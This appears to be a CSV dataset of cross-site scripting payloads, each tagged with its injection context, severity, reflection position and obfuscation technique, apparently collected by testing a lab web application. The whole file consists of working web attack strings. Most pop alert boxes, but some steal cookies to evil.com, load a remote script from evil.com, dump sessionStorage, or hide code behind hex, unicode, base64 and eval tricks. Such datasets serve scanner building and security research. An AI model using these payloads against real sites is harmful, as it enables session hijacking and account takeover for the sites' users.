payload,payload_with_context,context,severity,source,sink,reflection_position,technique
"oncontextmenu=""alert(1)""","oncontextmenu=""alert(1)"" [position:html_body]",tag_injection,medium,,,html_body,mutated
ONLOad='ALeRt(1)',ONLOad='ALeRt(1)' [position:html_body],tag_injection,medium,,,html_body,mutated
javascript:alert(1),javascript:alert(1) [position:html_body],script_injection,high,,,html_body,original
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:script]",tag_injection,medium,,,script,original
"<ScrIpt>alErt(strINg.fROMChARCODE(88,83,83))</sCRIPT>","<ScrIpt>alErt(strINg.fROMChARCODE(88,83,83))</sCRIPT> [position:html_body snippet_context:...title=""Delete this comment"">✕</button> </form> </div> <div><ScrIpt>alErt(strINg.fROMChARCODE(88,8]",tag_injection,high,,,html_body,mutated
${alert(	1)},${alert(	1)} [position:attribute],template_injection,high,,,attribute,obfuscated:tab_newline_inject
\' onerror=alert(1)//,\' onerror=alert(1)// [position:attribute],attribute_escape,low,,,attribute,original
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute_escape,low,,,attribute,original
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,"<img src=asdf onerror=alert(JSON.stringify(sessionStorage))> [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0""><img src=asdf one]",tag_injection,high,,,attribute,none
javascript:alert(document.domain),javascript:alert(document.domain) [position:script],js_uri,low,,,script,original
;alert(1);,";alert(1); [position:attribute snippet_context:...gap:.5rem""> <input name=""q"" value=""[Reflected in X-Search-Query header] ;alert(1);"" placeholder=""]",tag_injection,medium,,,attribute,none
' onerror=confirm(1) x=',' onerror=confirm(1) x=' [position:attribute],attribute_escape,medium,,,attribute,mutated
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:none]",dom_sink,high,,,none,obfuscated:hex_escape
onerror=alert(0);>,onerror=alert(0);> [position:html_body],tag_injection,medium,,,html_body,none
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:none]",attribute_escape,high,,,none,mutated
"""><svg onload=alert()>","""><svg onload=alert()> [position:html_body snippet_context:...st-meta""><span class=""post-author"">Anonymous</span> · just now</div> <div>""><svg onload=alert()><]",tag_injection,medium,,,html_body,none
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute_escape,low,,,attribute,obfuscated:url_encode
""" onclick=alert()1 a=""",""" onclick=alert()1 a="" [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong>"" onclick=alert()]",attribute_escape,medium,,,attribute,mutated
"<ScRIpT>D.iNNErhTML+='';</sCrIpT>//[""'`-->]]>]</div>","<ScRIpT>D.iNNErhTML+='';</sCrIpT>//[""'`-->]]>]</div> [position:html_body]",tag_injection,high,,,html_body,mutated
<SCRIPT src=//evil.com/xss.js></SCRIPT>,<SCRIPT src=//evil.com/xss.js></SCRIPT> [position:script],dom_sink,low,,,script,mutated
"onload=""prompt`1`""","onload=""prompt`1`"" [position:html_body snippet_context:...<div class=""post-meta""><span class=""post-author"">Guest</span></div> <div>onload=""prompt`1`""</div>]",tag_injection,medium,,,html_body,mutated
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:script],script_injection,high,,,script,mutated
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",js_uri,high,,,script,original
"""><details>alert(String.fromCharCode(88,83,83))</script>","""><details>alert(String.fromCharCode(88,83,83))</script> [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong>""><details>alert(]",attribute_escape,high,,,attribute,mutated
javascript:confirm(0);,"javascript:confirm(0); [position:attribute snippet_context:...iv> <div style=""margin-top:.75rem;font-size:.875rem""> 🔗 <a href=""javascript:confirm(0);"" style=""c]",js_uri,medium,,,attribute,none
"document.body.innerHTML=""<img src=x onerror=alert(1)>""","document.body.innerHTML=""<img src=x onerror=alert(1)>"" [position:script]",event_handler,medium,,,script,original
<%= alert(1) %>,<%= alert(1) %> [position:attribute],template_injection,medium,,,attribute,original
"setTimeout(""al'+'ert(1)"",0)","setTimeout(""al'+'ert(1)"",0) [position:script]",tag_injection,medium,,,script,obfuscated:concat_split
\' onload=alert(1)//,\' onload=alert(1)// [position:attribute],event_handler,low,,,attribute,mutated
${alert(1)},${alert(1)} [position:script],template_injection,low,,,script,original
"""><svg onload=alert()>","""><svg onload=alert()> [position:html_body snippet_context:...<section class=blog-header> <h1>0 search results for '""><svg onload=alert()>'</h1> <hr> </section]",tag_injection,medium,,,html_body,none
<svg src=x onerror=alert(1)>,<svg src=x onerror=alert(1)> [position:script],dom_sink,high,,,script,mutated
"<script>alert(String.fromCharCode(88,83,83))</script>","<script>alert(String.fromCharCode(88,83,83))</script> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=<script>alert(String.fromCharC]",tag_injection,high,,,attribute,encoding
setInterval('ale'+'rt(10)');,"setInterval('ale'+'rt(10)'); [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""setInterval('ale']",tag_injection,high,,,attribute,none
"<object data
=""javascript:alert(	1)"">","<object data
=""javascript:alert(	1)""> [position:html_body]",tag_injection,high,,,html_body,obfuscated:tab_newline_inject
alert(1),alert(1) [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'alert(1)'</code><],tag_injection,medium,,,script,none
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,original
</tag><svg onload=alert(1)>,</tag><svg onload=alert(1)> [position:dom],tag_injection,medium,,,dom,none
alert(2),"alert(2) [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0"">alert(2)</div> <f]",tag_injection,medium,,,attribute,none
\' onerror=alert(1)//,\' onerror=alert(1)// [position:attribute],event_handler,low,,,attribute,mutated
#{alert(1)},#{alert(1)} [position:attribute],js_uri,medium,,,attribute,original
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));","//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83)); [position:html_body snippet_context:...m"" style=""color:var(--text-muted);font-size:.875rem"">← DOM XSS</a> <!-- param:q=//--></SCRIPT><SC]",tag_injection,high,,,html_body,encoding|case_variation
<script ^__^>alert(String.fromCharCode(49))</script ^__^,<script ^__^>alert(String.fromCharCode(49))</script ^__^ [position:attribute snippet_context:...bject literal.</p> <h2>Multi-Param Reflection</h2> <p>a = </p><p>b = </p><p>c = <script ^__^>aler],tag_injection,high,,,attribute,encoding
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,"<img src=asdf onerror=alert(JSON.stringify(sessionStorage))> [position:script snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""<img src=asdf one]",tag_injection,high,,,script,none
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--","alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//-- [position:html_body snippet_context:alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--({""status"": ""ok"", ""m]",tag_injection,high,,,html_body,encoding
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,"<img src=asdf onerror=alert(JSON.stringify(sessionStorage))> [position:comment snippet_context:...le=""color:var(--text-muted);font-size:.875rem"">← DOM XSS</a> <!-- param:content=<img src=asdf one]",tag_injection,high,,,comment,none
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,medium,,,script,original
-alert(1)-',"-alert(1)-' [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""-alert(1)-'"" styl]",tag_injection,medium,,,attribute,none
confirm(),"confirm() [position:html_body snippet_context:confirm()({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:script],attribute_escape,high,,,script,original
"onblur=""alert(1)""","onblur=""alert(1)"" [position:html_body]",tag_injection,medium,,,html_body,mutated
"mrco24""type=image src onerror=""alert(1)""","mrco24""type=image src onerror=""alert(1)"" [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""mrco24""type=image]",tag_injection,medium,,,attribute,none
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:html_body],event_handler,medium,,,html_body,mutated
javascript:alert(document.domain),javascript:alert(document.domain) [position:attribute],js_uri,medium,,,attribute,original
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:html_body],script_injection,low,,,html_body,original
<scr/**/ipt>prompt(1)</scr/**/ipt>,<scr/**/ipt>prompt(1)</scr/**/ipt> [position:script],script_injection,low,,,script,obfuscated:comment_inject
confirm(),confirm() [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'confirm()'</code>],tag_injection,medium,,,script,none
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:script],attribute_escape,high,,,script,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:none]",js_uri,medium,,,none,original
javascript:alert(document.domain),javascript:alert(document.domain) [position:html_body],script_injection,high,,,html_body,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute_escape,low,,,attribute,original
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>","<script>d.innerHTML+='';</script>//[""'`-->]]>]</div> [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong><script>d.innerHT]",attribute_escape,high,,,attribute,none
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:></SCRIPT>"">'><SC]",tag_injection,high,,,attribute,encoding|case_variation
<image src/onerror=alert(1)>,"<image src/onerror=alert(1)> [position:dom snippet_context:Congratulations, you executed an alert:

1

You can now advance to the next level.]",tag_injection,medium,,,dom,none
onload='alert(1)',"onload='alert(1)' [position:html_body snippet_context:onload='alert(1)'({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
onerror=alert;throw 23;,"onerror=alert;throw 23; [position:attribute snippet_context:...<h2>Page Preview</h2> <form style=""margin-bottom:1rem""><input name=""src"" value=""onerror=alert;thr]",tag_injection,low,,,attribute,none
"//"";alERt(STRiNG.fROmcHArcodE(88,83,83))","//"";alERt(STRiNG.fROmcHArcodE(88,83,83)) [position:html_body snippet_context:...rm> </div> <div style=""font-size:.9rem;color:var(--text-secondary)"">//"";aleRT(STrIng.FroMcharCoDE]",tag_injection,high,,,html_body,mutated
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute_escape,low,,,attribute,mutated
<body onload=alert(1)>,<body onload=alert(1)> [position:style],event_handler,medium,,,style,obfuscated:comment_inject
\x3cbody onload=alert(1)\x3e,\x3cbody onload=alert(1)\x3e [position:style],attribute_escape,low,,,style,obfuscated:hex_escape
"document.body.innerHTML=""<svg src=x onerror=alert(1)>""","document.body.innerHTML=""<svg src=x onerror=alert(1)>"" [position:script]",dom_sink,medium,,,script,mutated
<image src/onerror=alert(1)>,<image src/onerror=alert(1)> [position:html_body],tag_injection,medium,,,html_body,none
#jAVAScRIPT:ALERT(2);,#jAVAScRIPT:ALERT(2); [position:attribute],js_uri,medium,,,attribute,mutated
<video src=x onerror=confirm(1)>,<video src=x onerror=confirm(1)> [position:script],event_handler,low,,,script,mutated
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:attribute]",attribute_escape,high,,,attribute,mutated
alert(1);,"alert(1); [position:attribute snippet_context:...=""avatar"">A</div> <div> <div style=""font-weight:600;font-size:1.1rem"">alert(1);</div> <div style=]",tag_injection,medium,,,attribute,none
<img src/onerror=prompt(8)>,"<img src/onerror=prompt(8)> [position:html_body snippet_context:<img src/onerror=prompt(8)>({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
#{confirm(1)},#{confirm(1)} [position:script],template_injection,high,,,script,mutated
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",dom_sink,medium,,,script,original
"document.write(""<img src=x onload=alert(1)>"")","document.write(""<img src=x onload=alert(1)>"") [position:attribute]",event_handler,high,,,attribute,mutated
<svgonload=alert(1)>,<svgonload=alert(1)> [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:<svg onload = ale],tag_injection,medium,,,attribute,none
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:script]",script_injection,low,,,script,original
""">< script>alert(String.fromCharCode(88,83,83))</script>",""">< script>alert(String.fromCharCode(88,83,83))</script> [position:html_body snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('"">< script>alert(]",tag_injection,high,,,html_body,mutated
"""><svg onload=alert()>","""><svg onload=alert()> [position:html_body snippet_context:..."">Untitled</div> <div style=""font-size:.9rem;color:var(--text-secondary)"">""><svg onload=alert()><]",tag_injection,medium,,,html_body,none
alert(1);,"alert(1); [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""alert(1);"" style=]",tag_injection,medium,,,attribute,none
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:style]",template_injection,low,,,style,original
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--","confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//-- [position:attribute snippet_context:...iv> <div style=""margin-top:.75rem;font-size:.875rem""> 🔗 <a href=""confirm(String.fromCharCode(88,8]",tag_injection,high,,,attribute,encoding
<BoDy oNlOaD=AlErT(1)>,<BoDy oNlOaD=AlErT(1)> [position:style],event_handler,high,,,style,obfuscated:mixed_case
\' onerror=alert(1)//,\' onerror=alert(1)// [position:html_body],attribute_escape,high,,,html_body,mutated
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:script],js_uri,low,,,script,original
javascript:confirm(1),javascript:confirm(1) [position:style],js_uri,low,,,style,mutated
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute_escape,low,,,attribute,original
\x3cscript\x3eprompt(1)\x3c/script\x3e,\x3cscript\x3eprompt(1)\x3c/script\x3e [position:script],script_injection,high,,,script,obfuscated:hex_escape
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--","alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//-- [position:html_body snippet_context:alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--({""status"": ""ok"", ""m]",tag_injection,high,,,html_body,encoding
"eval(""alert(1)"")","eval(""alert(1)"") [position:none]",js_uri,low,,,none,original
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = "";alert(String.fro]",tag_injection,high,,,attribute,encoding|case_variation
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,"<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=<body onunhandledrejection=ale]",tag_injection,high,,,attribute,none
<script>alert(1)</script>,<script>alert(1)</script> [position:script],script_injection,medium,,,script,original
<audio src/onerror=alert(1)>,"<audio src/onerror=alert(1)> [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('<audio src/onerro]",tag_injection,medium,,,attribute,none
""" onerror=confirm(1) x=""",""" onerror=confirm(1) x="" [position:html_body]",script_injection,medium,,,html_body,mutated
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,"<img src=asdf onerror=alert(JSON.stringify(sessionStorage))> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=<img src=asdf onerror=alert(JS]",tag_injection,high,,,attribute,none
\' onerror=al'+'ert(1)//,\' onerror=al'+'ert(1)// [position:script],attribute_escape,high,,,script,obfuscated:concat_split
<img src/onerror=prompt(8)>,"<img src/onerror=prompt(8)> [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""<img src/onerror=prompt(8]",tag_injection,medium,,,attribute,none
#{confirm(1)},#{confirm(1)} [position:none],js_uri,high,,,none,mutated
<input onfocus=al'+'ert(1) autofocus>,<input onfocus=al'+'ert(1) autofocus> [position:none],event_handler,medium,,,none,obfuscated:concat_split
_0x68087f:alert(0x1);,"_0x68087f:alert(0x1); [position:attribute snippet_context:...ail: <input id=""reader-email"" name=""email"" value=""""> <br><br> <a href=""_0x68087f:alert(0x1);"">Nex]",tag_injection,medium,,,attribute,none
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute_escape,medium,,,attribute,original
"<iframe src
=""javascript:alert(	1)"">","<iframe src
=""javascript:alert(	1)""> [position:html_body]",tag_injection,medium,,,html_body,obfuscated:tab_newline_inject
{{7*7}},{{7*7}} [position:style],template_injection,high,,,style,obfuscated:hex_escape
"&quot; onerror
=alert(	1) x
=&quot;","&quot; onerror
=alert(	1) x
=&quot; [position:script]",event_handler,high,,,script,obfuscated:tab_newline_inject
<body onload=alert(1)>,<body onload=alert(1)> [position:style],event_handler,medium,,,style,original
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,original
"\""\x3e\x3cimg src=x onerror=alert(1)\x3e","\""\x3e\x3cimg src=x onerror=alert(1)\x3e [position:style]",attribute_escape,low,,,style,obfuscated:hex_escape
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:;alert(String.fro]",tag_injection,high,,,attribute,encoding|case_variation
\x3cscript\x3econfirm(1)\x3c/script\x3e,\x3cscript\x3econfirm(1)\x3c/script\x3e [position:html_body],script_injection,high,,,html_body,obfuscated:hex_escape
<input onfocus=\u0061\u006cert(1) \u0061utofocus>,<input onfocus=\u0061\u006cert(1) \u0061utofocus> [position:none],event_handler,medium,,,none,obfuscated:unicode_escape
{{7*7}},{{7*7}} [position:style],template_injection,high,,,style,mutated
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:style]",attribute_escape,medium,,,style,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],tag_injection,medium,,,script,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],js_uri,high,,,script,original
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));","//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83)); [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7"">//--></SCRIPT><SCRIPT]",tag_injection,high,,,html_body,encoding|case_variation
<script>confirm(1)</script>,<script>confirm(1)</script> [position:html_body],script_injection,medium,,,html_body,obfuscated:unicode_escape
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--","alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//-- [position:html_body snippet_context:...title=""Delete this comment"">✕</button> </form> </div> <div>alert(String.fromCharCode(88,83,83))//]",tag_injection,high,,,html_body,encoding
"""><svg onload=alert(1)>","""><svg onload=alert(1)> [position:comment]",attribute_escape,medium,,,comment,none
onload=”alert(‘AnonKryptiQuz’),onload=”alert(‘AnonKryptiQuz’) [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:onload=”alert(‘An],attribute_escape,medium,,,attribute,none
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:style],js_uri,medium,,,style,mutated
"<svg onload=""confirm(7)"">","<svg onload=""confirm(7)""> [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:<svg onload=""conf]",tag_injection,medium,,,attribute,none
/?xss=500); alert(document.cookie);//,/?xss=500); alert(document.cookie);// [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '/?xss=500); alert],script_injection,high,,,script,none
嘼img src=1 onerror=alert(1)嘾,"嘼img src=1 onerror=alert(1)嘾 [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7"">嘼img src=1 onerror=al]",tag_injection,medium,,,html_body,none
<img src/onerror=alert(1)>,"<img src/onerror=alert(1)> [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0""><img src/onerror=]",tag_injection,medium,,,attribute,none
<img src/onerror=prompt(8)>,<img src/onerror=prompt(8)> [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:<img src/onerror=],tag_injection,medium,,,attribute,none
"eval(""alert(1)"")","eval(""alert(1)"") [position:none]",dom_sink,high,,,none,mutated
jAvAsCrIpT:CoNfIrM(1),jAvAsCrIpT:CoNfIrM(1) [position:script],dom_sink,low,,,script,obfuscated:mixed_case
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute_escape,medium,,,attribute,original
"""><button onload=alert()>","""><button onload=alert()> [position:html_body snippet_context:...rm> </div> <div style=""font-size:.9rem;color:var(--text-secondary)"">""><button onload=alert()></di]",tag_injection,medium,,,html_body,mutated
"{{([].toString()).constructor.prototype.charAt=[].join;$eval(([].toString()).constructor.fromCodePoint([120],[61],[49],[125],[125],[125],[59],[97],[108],[101],[114],[116],[40],[49],[41],[47],[47]));}}","{{([].toString()).constructor.prototype.charAt=[].join;$eval(([].toString()).constructor.fromCodePoint([120],[61],[49],[125],[125],[125],[59],[97],[108],[101],[114],[116],[40],[49],[41],[47],[47]));}} [position:attribute snippet_context:.../level4.png"" /> <br> <img src=""/static/loading.gif"" onload=""startTimer('{{([].toString()).constru]",js_uri,low,,,attribute,encoding
"\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss","\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong>\""<>onauxclick<>=]",attribute_escape,high,,,attribute,encoding
"""><svg onload=alert()>","""><svg onload=alert()> [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('""><svg onload=ale]",tag_injection,medium,,,attribute,none
"{{constructor.constructor(""\u0061\u006cert(1)"")()}}","{{constructor.constructor(""\u0061\u006cert(1)"")()}} [position:attribute]",template_injection,medium,,,attribute,obfuscated:unicode_escape
<svg id=1 onload=confirm(1)>,<svg id=1 onload=confirm(1)> [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '<svg id=1 onload=],tag_injection,medium,,,script,none
<SCRIPT>alert(1)</SCRIPT>,<SCRIPT>alert(1)</SCRIPT> [position:html_body],script_injection,medium,,,html_body,original
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute_escape,medium,,,attribute,original
<script>prompt(1)</script>,<script>prompt(1)</script> [position:attribute],attribute_escape,medium,,,attribute,original
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--","confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//-- [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""confirm(String.fr]",tag_injection,high,,,attribute,encoding
<BODY ONLOAD=alert(8839)>,"<BODY ONLOAD=alert(8839)> [position:html_body snippet_context:...<div class=""post-meta""><span class=""post-author"">Guest</span></div> <div><BODY ONLOAD=alert(8839)]",tag_injection,medium,,,html_body,case_variation
"#""><svg onload=alert(1)>","#""><svg onload=alert(1)> [position:comment]",attribute_escape,medium,,,comment,none
\u003e\u003cimg src=1 onerror=alert(0)\u003e,\u003e\u003cimg src=1 onerror=alert(0)\u003e [position:attribute],attribute_escape,medium,,,attribute,unicode_escape
-alert(23)/,"-alert(23)/ [position:attribute snippet_context:...<h2>Page Preview</h2> <form style=""margin-bottom:1rem""><input name=""src"" value=""-alert(23)/"" styl]",tag_injection,medium,,,attribute,none
"%20""><svg onload=alert(1)>","%20""><svg onload=alert(1)> [position:html_body snippet_context:%20""><svg onload=alert(1)>({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,url_encoding
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute_escape,high,,,attribute,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],dom_sink,low,,,script,obfuscated:comment_inject
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));","//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83)); [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""//--></SCRIPT><SC]",tag_injection,high,,,attribute,encoding|case_variation
alert(2),"alert(2) [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=alert(2)""> <link rel=""styleshe]",tag_injection,medium,,,attribute,none
"//"";alert(String.fromCharCode(88,83,83))","//"";alert(String.fromCharCode(88,83,83)) [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""//"";alert(String.]",tag_injection,high,,,attribute,encoding
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:script],event_handler,medium,,,script,original
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:script]",dom_sink,medium,,,script,mutated
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:html_body]",attribute_escape,high,,,html_body,original
</script><svg onload=alert(1)>,"</script><svg onload=alert(1)> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=</script><svg onload=alert(1)>]",tag_injection,medium,,,attribute,none
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--","alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//-- [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""alert(String.from]",tag_injection,high,,,attribute,encoding
"onerror=""alert(document.cookie)""","onerror=""alert(document.cookie)"" [position:html_body]",tag_injection,medium,,,html_body,mutated
onerror=alert(0);>,onerror=alert(0);> [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:onerror=alert(0);],tag_injection,medium,,,attribute,none
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--","confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//-- [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'confirm(String.fr]",tag_injection,high,,,script,encoding
